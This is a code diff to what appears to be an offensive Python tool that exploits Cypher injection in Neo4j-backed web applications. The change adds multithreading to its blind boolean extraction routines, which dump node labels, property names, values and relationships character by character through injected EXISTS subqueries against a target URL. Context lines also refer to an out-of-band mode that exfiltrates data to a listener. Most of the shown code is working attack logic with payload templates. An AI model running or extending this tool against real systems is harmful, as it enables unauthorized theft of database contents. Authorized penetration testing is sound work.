@@ -162,6 +162,16 @@ def check_vulnerability(apoc_version):
     else:
         print(f"APOC Version {apoc_version} is not affected by the known vulnerabilities.")
 
+def start_threads(thread_list):
+    """Starts a list of threads."""
+    for thread in thread_list:
+        thread.start()
+
+def join_threads(thread_list):
+    """Joins a list of threads."""
+    for thread in thread_list:
+        thread.join()
+
 
 class RequestHandler(BaseHTTPRequestHandler):
     """Handles HTTP GET requests."""
@@ -185,6 +195,35 @@ class Listener():
 
     def stop_listener(self):
         self.server.shutdown()
+
+class Printer():
+    """A Class to handle printing for multi threading"""
+    def __init__(self, threads):
+        self.parts = list("" for i in range(threads))
+
+    def split_into_parts(self, length):
+        part_count = len(self.parts)
+        part_length = length // part_count
+        part_lengths = []
+        for i in range(part_count):
+            self.parts[i] += "_" * part_length
+        for i in range(length - (part_length * part_count)):
+            self.parts[i] += "_"
+        for i in range(part_count):
+            part_lengths.append(len(self.parts[i]))
+        return part_lengths
+    
+    def update_part(self, part, char, index):
+        self.parts[part] = self.parts[part][:index] + char + self.parts[part][index + 1:]
+
+    def get_whole(self):
+        whole = ""
+        for part in self.parts:
+            whole += part
+        return whole
+
+    def print_whole(self, end="\n"):
+        print(self.get_whole(), end=end)
 
 class oob_Neo4jInjector:
     """Handles the injection of payloads into a Neo4j database with out of band exfiltration."""
@@ -446,18 +485,25 @@ class oob_Neo4jInjector:
 
 class ib_Neo4jInjector:
     """Handles the injection of payloads into a Neo4j database."""
-    def __init__(self, target, listen_port, request_type, parameters, cookie=None, blind_string=""):
+    def __init__(self, target, listen_port, request_type, parameters, threads, cookie=None, blind_string=""):
         self.target = target
         #self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
         self.request_type = request_type
         self.parameters = parameters
         self.cookie = cookie if cookie else ""
         self.blind_string = blind_string
+        self.threads = threads
         self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
         self.proxies = {}
         #self.proxies = {'http': 'http://127.0.0.1:8080'}
         self.base_case = None
         self.working_char = ""
+
+    def update_print(self, printer, print_event, stop_event):
+        while (not stop_event.is_set()):
+            if (print_event.is_set()):
+                print(f"[-] Dumping: {printer.get_whole()}", end="\r")
+                print_event.clear()
 
     def inject_payload(self, payload):
         """Inject a crafted payload to the target and return the response object."""
@@ -608,25 +654,59 @@ class ib_Neo4jInjector:
         animation = "|/-\\"
         anim_index = 0
         for count_index, size in label_sizes.items():
-            label = ''
-            for size_index in range(size):
-                break_flag = False
-                for char in valid_chars:
-                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
-                    print(f"[{animation[anim_index % len(animation)]}] building label: {label}{char}", end='\r', flush=True)
-                    anim_index += 1
-                    for response in responses:
-                        break_flag = self.check_true(response)
-                        if (break_flag):
-                            label += char
-                            break
-                    if (break_flag):
-                        break
+            label = Printer(self.threads)
+            label_part_sizes = label.split_into_parts(size)
+            print(f"[-] Dumping: {label.get_whole()}", end="\r")
+            offset = 0
+            threads = []
+            print_event = threading.Event()
+            stop_event = threading.Event()
+            for i in range(len(label_part_sizes)):
+                if ("_" not in label.parts[i]):
+                    continue
+                threads.append(threading.Thread(target=self.dump_label_part, args=(label, i, count_index, label_part_sizes[i], offset, valid_chars, print_event)))
+                offset += label_part_sizes[i]
+            printer_thread = threading.Thread(target=self.update_print, args=(label, print_event, stop_event))
+            printer_thread.start()
+            start_threads(threads)
+            join_threads(threads)
+            stop_event.set()
+            printer_thread.join()
+            # label = ''
+            # for size_index in range(size):
+            #     break_flag = False
+            #     for char in valid_chars:
+            #         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+            #         print(f"[{animation[anim_index % len(animation)]}] building label: {label}{char}", end='\r', flush=True)
+            #         anim_index += 1
+            #         for response in responses:
+            #             break_flag = self.check_true(response)
+            #             if (break_flag):
+            #                 label += char
+            #                 break
+            #         if (break_flag):
+            #             break
             print(" " * 150, end='\r')
-            print(f"[+] {label}")
-            labels.append(label)
+            print(f"[+] {label.get_whole()}")
+            labels.append(label.get_whole())
         return labels
 
+    def dump_label_part(self, label, label_part, count_index, size, offset, valid_chars, print_event):
+        for size_index in range(offset, size + offset):
+            break_flag = False
+            for char in valid_chars:
+                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+                # print(f"[{animation[anim_index % len(animation)]}] building label: {label}{char}", end='\r', flush=True)
+                # anim_index += 1
+                for response in responses:
+                    break_flag = self.check_true(response)
+                    if (break_flag):
+                        # label_part = label_part[:(size_index - offset)] + char + label_part[(size_index - offset + 1):]
+                        label.update_part(label_part, char, size_index - offset)
+                        break
+                if (break_flag):
+                    break
+            print_event.set()
 
     def find_property_counts(self, labels):
         property_counts_dict = {}
@@ -683,27 +763,62 @@ class ib_Neo4jInjector:
             print(f"\n[*] Label: {label}")
             print(f"[+] available properties [{len(size_dict)}]:")
             for count_index, size in size_dict.items():
-                pr0perty = ''
-                for size_index in range(size):
-                    break_flag = False
-                    for char in valid_chars:
-                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(toString(list[{count_index}]),{size_index},1) = '{char}' RETURN list}}"))
-                        print(f"[{animation[anim_index % len(animation)]}] building property: {pr0perty}{char}", end='\r', flush=True)
-                        anim_index += 1
-                        for response in responses:
-                            break_flag = self.check_true(response)
-                            if (break_flag):
-                                    pr0perty += char
-                                    break 
-                        if (break_flag):
-                            break
+                pr0perty = Printer(self.threads)
+                pr0perty_part_sizes = pr0perty.split_into_parts(size)
+                print(f"[-] Dumping: {pr0perty.get_whole()}", end="\r")
+                offset = 0
+                threads = []
+                print_event = threading.Event()
+                stop_event = threading.Event()
+                for i in range(len(pr0perty_part_sizes)):
+                    if ("_" not in pr0perty.parts[i]):
+                        continue
+                    threads.append(threading.Thread(target=self.dump_property_part, args=(label, pr0perty, i, count_index, pr0perty_part_sizes[i], offset, valid_chars, print_event)))
+                    offset += pr0perty_part_sizes[i]
+                printer_thread = threading.Thread(target=self.update_print, args=(pr0perty, print_event, stop_event))
+                printer_thread.start()
+                start_threads(threads)
+                join_threads(threads)
+                stop_event.set()
+                printer_thread.join()
+
+                # pr0perty = ''
+                # for size_index in range(size):
+                #     break_flag = False
+                #     for char in valid_chars:
+                #         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(toString(list[{count_index}]),{size_index},1) = '{char}' RETURN list}}"))
+                #         print(f"[{animation[anim_index % len(animation)]}] building property: {pr0perty}{char}", end='\r', flush=True)
+                #         anim_index += 1
+                #         for response in responses:
+                #             break_flag = self.check_true(response)
+                #             if (break_flag):
+                #                     pr0perty += char
+                #                     break 
+                #         if (break_flag):
+                #             break
                 print(" " * 150, end='\r') 
-                print(f"[++] {pr0perty}")
+                print(f"[++] {pr0perty.get_whole()}")
                 if label in properties_dict:
-                    properties_dict[label].append(pr0perty)
+                    properties_dict[label].append(pr0perty.get_whole())
                 else:
-                    properties_dict[label] = [pr0perty]
+                    properties_dict[label] = [pr0perty.get_whole()]
         return properties_dict
+    
+    def dump_property_part(self, label, pr0perty, pr0perty_part, count_index, size, offset, valid_chars, print_event):
+        for size_index in range(offset, size + offset):
+            break_flag = False
+            for char in valid_chars:
+                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(toString(list[{count_index}]),{size_index},1) = '{char}' RETURN list}}"))
+                # print(f"[{animation[anim_index % len(animation)]}] building property: {pr0perty}{char}", end='\r', flush=True)
+                # anim_index += 1
+                for response in responses:
+                    break_flag = self.check_true(response)
+                    if (break_flag):
+                            pr0perty.update_part(pr0perty_part, char, size_index - offset)
+                            break 
+                if (break_flag):
+                    break
+            print_event.set()
 
     def find_value_counts(self, properties_dict):
         value_counts_dict = {}
@@ -775,24 +890,42 @@ class ib_Neo4jInjector:
                     values_dict[label][pr0perty] = {}
 
                 for count_index, size in size_dict.items():
-                    value = ''
-                    for size_index in range(size):
-                        break_flag = False
-                        for char in valid_chars:
-                            responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(toString(id(x)) + '::' + x.{pr0perty}) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
-                            print(f"[{animation[anim_index % len(animation)]}] building value: {value}{char}", end='\r', flush=True)
-                            anim_index += 1
-                            for response in responses:
-                                break_flag = self.check_true(response)
-                                if (break_flag):
-                                    value += char
-                                    break  # Found the size for this occurrence, no need to continue
-                            if (break_flag):
-                                break
+                    value = Printer(self.threads)
+                    value_part_sizes = value.split_into_parts(size)
+                    print(f"[-] Dumping: {value.get_whole()}", end="\r")
+                    offset = 0
+                    threads = []
+                    print_event = threading.Event()
+                    stop_event = threading.Event()
+                    for i in range(len(value_part_sizes)):
+                        if ("_" not in value.parts[i]):
+                            continue
+                        threads.append(threading.Thread(target=self.dump_value_part, args=(label, pr0perty, value, i, count_index, value_part_sizes[i], offset, valid_chars, print_event)))
+                        offset += value_part_sizes[i]
+                    printer_thread = threading.Thread(target=self.update_print, args=(value, print_event, stop_event))
+                    printer_thread.start()
+                    start_threads(threads)
+                    join_threads(threads)
+                    stop_event.set()
+                    printer_thread.join()
+                    # value = ''
+                    # for size_index in range(size):
+                    #     break_flag = False
+                    #     for char in valid_chars:
+                    #         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(toString(id(x)) + '::' + x.{pr0perty}) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+                    #         print(f"[{animation[anim_index % len(animation)]}] building value: {value}{char}", end='\r', flush=True)
+                    #         anim_index += 1
+                    #         for response in responses:
+                    #             break_flag = self.check_true(response)
+                    #             if (break_flag):
+                    #                 value += char
+                    #                 break  # Found the size for this occurrence, no need to continue
+                    #         if (break_flag):
+                    #             break
                     print(" " * 150, end='\r') 
-                    print(f"[+++] {''.join(value.split('::')[1::])}")
+                    print(f"[+++] {''.join(value.get_whole().split('::')[1::])}")
 
-                    values_dict[label][pr0perty][count_index] = value
+                    values_dict[label][pr0perty][count_index] = value.get_whole()
 
         # convert to json format and display as table
         for label, properties in values_dict.items():
@@ -823,6 +956,22 @@ class ib_Neo4jInjector:
             convert_dict_to_table(json_output)
 
         return(values_dict)
+    
+    def dump_value_part(self, label, pr0perty, value, value_part, count_index, size, offset, valid_chars, print_event):
+        for size_index in range(offset, size + offset):
+            break_flag = False
+            for char in valid_chars:
+                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(toString(id(x)) + '::' + x.{pr0perty}) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+                # print(f"[{animation[anim_index % len(animation)]}] building value: {value}{char}", end='\r', flush=True)
+                # anim_index += 1
+                for response in responses:
+                    break_flag = self.check_true(response)
+                    if (break_flag):
+                        value.update_part(value_part, char, size_index - offset)
+                        break  # Found the size for this occurrence, no need to continue
+                if (break_flag):
+                    break
+            print_event.set()
 
     def find_rel_type_counts(self):
         animation = "|/-\\"
@@ -938,24 +1087,58 @@ class ib_Neo4jInjector:
         for rel_type, size_dict in rel_sizes_dict.items():
             print(f"[+] relationship: {rel_type}")
             for count_index, size in size_dict.items():
-                rel = ''
-                for size_index in range(size):
-                    break_flag = False
-                    for char in valid_chars:
-                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + '::' + toString(id(node1)) + '::{rel_type}::' + label2 + '::' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
-                        print(f"[{animation[anim_index % len(animation)]}] building relationship: {rel}{char}", end='\r', flush=True)
-                        anim_index += 1
-                        for response in responses:
-                            break_flag = self.check_true(response)
-                            if (break_flag):
-                                    rel += char
-                                    break 
-                        if (break_flag):
-                            break
+                rel = Printer(self.threads)
+                rel_part_sizes = rel.split_into_parts(size)
+                print(f"[-] Dumping: {rel.get_whole()}", end="\r")
+                offset = 0
+                threads = []
+                print_event = threading.Event()
+                stop_event = threading.Event()
+                for i in range(len(rel_part_sizes)):
+                    if ("_" not in rel.parts[i]):
+                        continue
+                    threads.append(threading.Thread(target=self.dump_rel_part, args=(rel_type, rel, i, count_index, rel_part_sizes[i], offset, valid_chars, print_event)))
+                    offset += rel_part_sizes[i]
+                printer_thread = threading.Thread(target=self.update_print, args=(rel, print_event, stop_event))
+                printer_thread.start()
+                start_threads(threads)
+                join_threads(threads)
+                stop_event.set()
+                printer_thread.join()
+                # rel = ''
+                # for size_index in range(size):
+                #     break_flag = False
+                #     for char in valid_chars:
+                #         responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + '::' + toString(id(node1)) + '::{rel_type}::' + label2 + '::' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+                #         print(f"[{animation[anim_index % len(animation)]}] building relationship: {rel}{char}", end='\r', flush=True)
+                #         anim_index += 1
+                #         for response in responses:
+                #             break_flag = self.check_true(response)
+                #             if (break_flag):
+                #                     rel += char
+                #                     break 
+                #         if (break_flag):
+                #             break
                 print(" " * 150, end='\r') 
-                print(f"[++] {rel}")
-                rels_dict[rel_type] = rel
-        return rels_dict 
+                print(f"[++] {rel.get_whole()}")
+                rels_dict[rel_type] = rel.get_whole()
+        return rels_dict
+    
+    def dump_rel_part(self, rel_type, rel, rel_part, count_index, size, offset, valid_chars, print_event):
+        for size_index in range(offset, size + offset):
+            break_flag = False
+            for char in valid_chars:
+                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + '::' + toString(id(node1)) + '::{rel_type}::' + label2 + '::' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+                # print(f"[{animation[anim_index % len(animation)]}] building relationship: {rel}{char}", end='\r', flush=True)
+                # anim_index += 1
+                for response in responses:
+                    break_flag = self.check_true(response)
+                    if (break_flag):
+                            rel.update_part(rel_part, char, size_index - offset)
+                            break 
+                if (break_flag):
+                    break
+            print_event.set()
 
     def verify_rels(self, rels_dict):
         animation = "|/-\\"
@@ -978,7 +1161,7 @@ class ib_Neo4jInjector:
                     break
                 
         print(" " * 150, end='\r')
-        write_list_to_file(found_relationships)
+        write_list_to_file(verified_rels)
 
         print(f"\n[*] available relationships [{len(verified_rels)}]")
         for rel_type in rels_dict.keys():
@@ -1017,11 +1200,10 @@ def main():
     parser.add_argument("-u", "--url", required=True, help="Target URL")
     parser.add_argument("-p", "--parameters", default="", help="Vulnerable parameters")
     parser.add_argument("-c", "--cookie", help="Optional cookie in format key=value")
-    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type")
+    parser.add_argument("-m", "--method", required=True, choices=['API', 'GET', 'POST'], help="Request method")
     parser.add_argument("-i", "--int", help="Network interface for dynamic IP retrieval, 'public' for ngrok")
     parser.add_argument("-s", "--blind-string", help="String that returns true from the database")
     parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
-
 
     parser.add_argument("--out-of-band", action="store_true", help="Enable out-of-band (OOB) mode, uses LOADCSV/APOC version of it")
     parser.add_argument("--in-band", action="store_true", help="Enable in-band (IB) mode, uses boolean based injection")
@@ -1032,6 +1214,8 @@ def main():
     parser.add_argument("--properties", action="store_true", help="Dump properties for a specified label (-L)")
     parser.add_argument("-P", "--property", help="Specify properties to dump values; to dump values of multiple properties, delimit each property with a comma (e.g. foo,bar) (-L must also be used)")
     parser.add_argument("-R", "--relationships", action="store_true", help="Dump all relationships in the database")
+
+    parser.add_argument("-t", "--threads", type=int, default=1, help="specify the number of threads to use (only works for in band)")
 
     args = parser.parse_args()
 
@@ -1068,7 +1252,7 @@ def main():
         else:
             args.exfil_ip = "127.0.0.1"
 
-        injector = oob_Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
+        injector = oob_Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.method, args.parameters, args.cookie)
 
         if injector.detect_inject():
             print(colored("[*] target likely injectable, continuing", "green"))
@@ -1118,7 +1302,7 @@ def main():
         return
 
     elif args.in_band:
-        injector = ib_Neo4jInjector(args.url, args.listen_port, args.type, args.parameters, args.cookie, args.blind_string)
+        injector = ib_Neo4jInjector(args.url, args.listen_port, args.method, args.parameters, args.threads, args.cookie, args.blind_string)
 
         if (injector.detect_inject()):
             print(colored("[*] target likely injectable, continuing", "green"))
